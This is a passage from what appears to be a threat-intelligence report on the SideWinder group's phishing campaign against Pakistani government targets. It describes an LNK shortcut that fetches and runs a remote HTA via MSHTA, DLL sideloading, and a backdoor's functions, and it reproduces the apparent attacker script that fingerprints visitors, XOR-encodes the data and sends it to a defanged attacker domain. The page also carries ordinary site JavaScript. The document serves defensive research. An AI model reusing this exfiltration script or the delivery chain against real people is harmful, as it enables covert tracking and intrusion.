<div id="attachment_20454" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20454" decoding="async" class="size-full wp-image-20454" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%20769'%3E%3C/svg%3E" alt="A snippet of SideWinder.AntiBot.Script" width="1600" height="769" data-lazy-src="https://www.group-ib.com/wp-content/uploads/27.webp" /><noscript><img aria-describedby="caption-attachment-20454" decoding="async" class="size-full wp-image-20454" src="https://www.group-ib.com/wp-content/uploads/27.webp" alt="A snippet of SideWinder.AntiBot.Script" width="1600" height="769" /></noscript><p id="caption-attachment-20454" class="wp-caption-text">Image 27. A snippet of SideWinder.AntiBot.Script</p></div>
<p>Accordingly, the structure of network requests on this domain is as follows:</p>
<div id="attachment_20455" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20455" decoding="async" class="size-full wp-image-20455" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201022'%3E%3C/svg%3E" alt="Screenshot with network requests" width="1600" height="1022" data-lazy-src="https://www.group-ib.com/wp-content/uploads/28.webp" /><noscript><img aria-describedby="caption-attachment-20455" decoding="async" class="size-full wp-image-20455" src="https://www.group-ib.com/wp-content/uploads/28.webp" alt="Screenshot with network requests" width="1600" height="1022" /></noscript><p id="caption-attachment-20455" class="wp-caption-text">Image 28. Screenshot with network requests</p></div>
<p>The screenshot above shows link clicks from the initial phishing link &#8211; <em>hxxps://finance.govpk-mail[.]net/financecircular-38149cbd</em> to the page with the script, which is responsible for releasing the malicious file:</p>
<div id="attachment_20456" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20456" decoding="async" class="size-full wp-image-20456" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201005'%3E%3C/svg%3E" alt="A piece of malicious code that issues a payload" width="1600" height="1005" data-lazy-src="https://www.group-ib.com/wp-content/uploads/29.webp" /><noscript><img aria-describedby="caption-attachment-20456" decoding="async" class="size-full wp-image-20456" src="https://www.group-ib.com/wp-content/uploads/29.webp" alt="A piece of malicious code that issues a payload" width="1600" height="1005" /></noscript><p id="caption-attachment-20456" class="wp-caption-text">Image 29. A piece of malicious code that issues a payload</p></div>
<h3>Payload</h3>
<p>In one case the downloadable file (<em>SHA1- 4421f214c91a08ac0318871c6f918cfffe36d039</em>) was an archive named &#8220;<em>Pay and Pension Increase Circular_Finance Division.zip</em>&#8221;</p>
<p>The contents of this archive consist of files:</p>
<ul>
<li><em>64a889e35b10a902170abe092c6c6b8f16c66dd1 &#8211; Pay and Pension Increase Circular_Finance Division.pdf.lnk;</em></li>
<li><em>5e5e038453fde5ddf57820783dd9ce8f5f042df2 &#8211; ~wnotification002.tmp;</em></li>
<li><em>6a99ce5387c5b67602b2ef633bfbdc184e4d845c &#8211; ~wnotification003.tmp.</em></li>
</ul>
<div id="attachment_20457" style="width: 1302px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20457" decoding="async" class="size-full wp-image-20457" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201292%2096'%3E%3C/svg%3E" alt="Contents of &quot;Pay and Pension Increase Circular_Finance Division.zip&quot;" width="1292" height="96" data-lazy-src="https://www.group-ib.com/wp-content/uploads/30.webp" /><noscript><img aria-describedby="caption-attachment-20457" decoding="async" class="size-full wp-image-20457" src="https://www.group-ib.com/wp-content/uploads/30.webp" alt="Contents of &quot;Pay and Pension Increase Circular_Finance Division.zip&quot;" width="1292" height="96" /></noscript><p id="caption-attachment-20457" class="wp-caption-text">Image 30. Contents of &#8220;Pay and Pension Increase Circular_Finance Division.zip&#8221;</p></div>
<p><em>&#8220;Pay and Pension Increase Circular_Finance Division.pdf.lnk&#8221;</em> is a shortcut that contains a command to download and execute the file <em>hxxps://finance.govpk-mail[.]net/15523/1/12443/2/0/0/1/1874254181/79DWxM3xhqvyZapU4oq7D3M8j5wB6f4HVHnbIEc/files-60b6e42b/hta</em> using MSHTA.</p>
<div id="attachment_20458" style="width: 1170px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20458" decoding="async" class="size-full wp-image-20458" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201160%20661'%3E%3C/svg%3E" alt="Contents of &quot;Pay and Pension Increase Circular_Finance Division.pdf.lnk" width="1160" height="661" data-lazy-src="https://www.group-ib.com/wp-content/uploads/31.webp" /><noscript><img aria-describedby="caption-attachment-20458" decoding="async" class="size-full wp-image-20458" src="https://www.group-ib.com/wp-content/uploads/31.webp" alt="Contents of &quot;Pay and Pension Increase Circular_Finance Division.pdf.lnk" width="1160" height="661" /></noscript><p id="caption-attachment-20458" class="wp-caption-text">Image 31. Contents of &#8220;Pay and Pension Increase Circular_Finance Division.pdf.lnk</p></div>
<p>Unfortunately, the second stage of the payload turned out to be inactive, so we got a &#8220;<em>404 Not Found</em>&#8221; error.</p>
<div id="attachment_20459" style="width: 1186px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20459" decoding="async" class="size-full wp-image-20459" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201176%20728'%3E%3C/svg%3E" alt="Screenshot of the error " width="1176" height="728" data-lazy-src="https://www.group-ib.com/wp-content/uploads/32.webp" /><noscript><img aria-describedby="caption-attachment-20459" decoding="async" class="size-full wp-image-20459" src="https://www.group-ib.com/wp-content/uploads/32.webp" alt="Screenshot of the error " width="1176" height="728" /></noscript><p id="caption-attachment-20459" class="wp-caption-text">Image 32. Screenshot of the error receiving the second stage of the payload.</p></div>
<p><strong>However, this attack is not unique to SideWinder group</strong>. HTAs typically contain PowerShell, VBScript, or JavaScript, and the latter has been seen more often in recent attacks.</p>
<p>HTAs are typically used to download files for later use by the DLL-sideloading technique. In some cases, HTAs also upload a decoy document, usually in PDF format, to put the victim&#8217;s attention down.</p>
<p>The use of this technique by this group was <a href="https://mp.weixin.qq.com/s/Kkta59k7r81uIBjJvE9pCw" target="_blank" rel="nofollow noopener">mentioned publicly</a> by researchers from <strong>weixin</strong>:</p>
<div id="attachment_20460" style="width: 652px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20460" decoding="async" class="size-full wp-image-20460" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20642%20597'%3E%3C/svg%3E" alt="Fragment of Kill Chain" width="642" height="597" data-lazy-src="https://www.group-ib.com/wp-content/uploads/33.webp" /><noscript><img aria-describedby="caption-attachment-20460" decoding="async" class="size-full wp-image-20460" src="https://www.group-ib.com/wp-content/uploads/33.webp" alt="Fragment of Kill Chain" width="642" height="597" /></noscript><p id="caption-attachment-20460" class="wp-caption-text">Image 33. Fragment of Kill Chain taken from https://mp.weixin.qq.com/s/Kkta59k7r81uIBjJvE9pCw</p></div>
<p>When using this technique, HTA will load the &#8220;Duser.dll&#8221; file and copy the system file &#8220;credwiz.exe&#8221; into the same directory. The &#8220;credwiz.exe&#8221; loads &#8220;Duser.dll&#8221; with the Dll Side-Loading technique, which in turn downloads and executes the final backdoor.</p>
<p>The final backdoor allows the attacker:</p>
<ul>
<li>Collect system information;</li>
<li>Collect list of files and paths to them;</li>
<li>Collect selected files;</li>
<li>Update commands and C2 addresses.</li>
</ul>
<h2>Sidewinder antibot &#8211; Conclusion</h2>
<p>Given the <strong>SideWinder</strong>’s widespread activity deploying new command and control servers and the number of observed phishing links, Group-IB Threat Intelligence team decided to publish these findings so that potential targets in Pakistan identified as part of the research could check their networks and identify attacks by Sidewinder that are in early stages. If you believe you may be a victim of similar phishing campaigns or that you may be one of the attackers’ targets, please reach out.</p>
</div>

function buttonClick() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    x.innerHTML = 'Geolocation is not supported by this browser.';
  }
}

function showPosition(position) {
  alert(`lat ${position.coords.latitude} long ${position.coords.longitude}`);
}

var postUrl = 'https://finance.pakgov[.]net/733/1/670/2/0/0/1874372994/HvEdALWHsRoqS3eIArlDgXiyAcvV5TsjfqF7kVAK/files-8adb0199/ads';

function encode(data, xorKey) {
  let enc = new TextEncoder();
  let dataBuff = enc.encode(data);
  let keyBuff = enc.encode(xorKey);

  let output = [];

  for (let i = 0; i < dataBuff.length; i++) output[i] = dataBuff[i] ^ keyBuff[i % keyBuff.length];

  return new Blob([new Uint8Array(output)]);
}

function redirect() {
  window.location.replace('https://www.finance.gov.pk/circulars/circular_14042022_2.pdf');
}

function postData(data) {
  try {
    var secretKey = '34-D4-3D-5B-6E-31-77-E7-27-06-96-CE-BE-E6-B5';
    const finalData = JSON.stringify(data);
    const encriptedData = encode(finalData, secretKey);

    fetch(postUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/text'
      },
      body: encriptedData
    })
      .then(() => {
        redirect();
      })
      .catch((err) => {
        redirect();
      });
  } catch (err) {
    redirect();
  }
}

function isCanvasSupported() {
  var elem = document.createElement('canvas');
  return !!(elem.getContext && elem.getContext('2d'));
}

function getBrowserDetails(gpuData) {
  var result = {};
  try {
    result.gpuData = gpuData;
    result.navigatorInfo = {
      oscpu: navigator.oscpu,
      credentials: navigator.credentials,
      clipboard: navigator.clipboard,
      hardwareConcurrency: navigator.hardwareConcurrency,
      geolocation: navigator.geolocation,
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages
    };
    try {
      result.canvasSupported = isCanvasSupported();
    } catch (canvasErr) {}

    result.utcOffset = new Date().getTimezoneOffset() / 60;
    postData(result);
  } catch (err) {
    redirect();
  }
}

function postDetection(data) {
  var detectionPostUrl = 'https://finance.pakgov[.]net/733/1/670/2/0/0/1874372994/HvEdALWHsRoqS3eIArlDgXiyAcvV5TsjfqF7kVAK/files-867fdc8a/adscom';
  try {
    fetch(detectionPostUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/text'
      },
      body: data
    })
      .then(() => {
        redirect();
      })
      .catch((err) => {
        redirect();
      });
  } catch (err) {
    redirect();
  }
}

                        jQuery(window).on('load', function () {
                          let accordion895 = document.querySelector('.accordionList895');
                          if (accordion895) {
                            let items = accordion895.querySelectorAll('.accordion-item');
                            let title = accordion895.querySelectorAll('.accordion-item__title');

                            function toggleAccordion() {
                              let thisItem = this.parentNode;
                              items.forEach((item) => {
                                if (thisItem == item) {
                                  thisItem.classList.toggle('active');
                                  return;
                                }
                                item.classList.remove('active');
                              });
                            }

                            title.forEach((question) => question.addEventListener('click', toggleAccordion));
                          } 
                        });

<script type="text/rocketlazyloadscript">
    const postcontent = document.getElementById('blog-post-content');
    const h2counter = postcontent.getElementsByTagName('h2');

    for (i = 0; i < h2counter.length; i++) {
        const h2elementtag = postcontent.getElementsByTagName('h2')[i];
        const h2element = postcontent.getElementsByTagName('h2')[i].innerHTML;
        let postnavitem = document.createElement('a');
        postnavitem.classList.add('post-navigation__item', 'subtitle2', 'scrollto');
        postnavitem.innerHTML = h2element;
        const postnavlink = postnavitem.innerHTML;
        let str = postnavlink;
        str = str.replace(/<[^>]*>/g, '');
        str = str.replace(/[^a-zA-Z0-9\s\u0400-\u04FF]/g, '');
        str = str.replace(/\s+/g, '-').toLowerCase();
        str = str.replace(/^-+|-+$/g, '');
        postnavitem.classList += ' ' + str;
        postnavitem.href = '#' + str;
        h2elementtag.id = str;
        document.getElementById('post-navigation__wrapper').appendChild(postnavitem);
    }

    const sections = document.querySelectorAll('h2');
    const navItems = document.querySelectorAll('.post-navigation__item');

    window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach((section) => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.clientHeight;
            if (pageYOffset >= sectionTop - sectionHeight / 10) {
                current = section.getAttribute('id');
            }
        });

        navItems.forEach((a) => {
            a.classList.remove('active');
            if (a.classList.contains(current)) {
                a.classList.add('active');
            }
        });
    });

    // SMOOTH SCROLL
    var $root = jQuery('html, body');


    jQuery('a[href^="#"].scrollto').click(function() {
        var href = jQuery.attr(this, 'href');
        var headerHeight = 100;

        $root.animate({
                scrollTop: jQuery(href).offset().top - headerHeight
            },
            300,
        );

        return false;
    });

    // SMOOTH SCROLL WITH NO HASH
    var $root = jQuery('html, body');


    jQuery('a[href^="#"].scrolltonohash').click(function() {
        var href = jQuery.attr(this, 'href');
        var headerHeight = 100;

        $root.animate({
                scrollTop: jQuery(href).offset().top - headerHeight
            },
            300
        );

        return false;
    });
</script>

<script type="text/rocketlazyloadscript">
    function readingTime() {
        const text = document.getElementById("blog-post-content").innerText;
        const wpm = 225;
        const words = text.trim().split(/\s+/).length;
        const time = Math.ceil(words / wpm);
        document.getElementById("reading-time").innerText = time;
    }
    readingTime();
</script>

    function positioningSidebar() {
        let sidebar = document.getElementById('sidebar');
        let sidebarHeight = sidebar.offsetHeight;
        let windowHeight = document.documentElement.clientHeight;
        if (windowHeight < (sidebarHeight + 48)) {
            let sidebarAuthors = sidebar.querySelector('.sidebar__authors');
            let sidebarMorePosts = sidebar.querySelector('.sidebar__more-posts');
            let authorsHeight = sidebarAuthors ? sidebarAuthors.offsetHeight : 0;
            let morePostsHeight = sidebarMorePosts ? sidebarMorePosts.offsetHeight : 0;
            let sidebarTop = authorsHeight + morePostsHeight + 140;
            jQuery(sidebar).css('top', -sidebarTop + 'px');
        } else {
            jQuery(sidebar).css('top', '72px');
        }
    }
    window.addEventListener('resize', positioningSidebar);
    positioningSidebar();

    if (localStorage.getItem('theme')) {
        if (localStorage.getItem('theme') == 'dark') {
            jQuery('body').addClass('theme--dark');
        } else if (localStorage.getItem('theme') == 'light') {
            jQuery('body').addClass('theme--white');
        }
    } else {
        localStorage.setItem('theme', 'dark');
        jQuery('body').addClass('theme--dark');
    }

    jQuery('.theme-toggle').click(function() {
        if (localStorage.getItem('theme') == 'dark') {
            localStorage.setItem('theme', 'light');
        } else {
            localStorage.setItem('theme', 'dark');
        }
        jQuery('body').toggleClass('no-transition');
        jQuery('body').toggleClass('theme--dark');
        jQuery('body').toggleClass('theme--white');
        setTimeout(() => {
            jQuery('body').toggleClass('no-transition');
        }, 250);
    });
    jQuery('.share-toggle').click(function() {
        jQuery('.share-toggle').toggleClass('active');
        jQuery('.share-widget').toggleClass('show');
    });
</script>
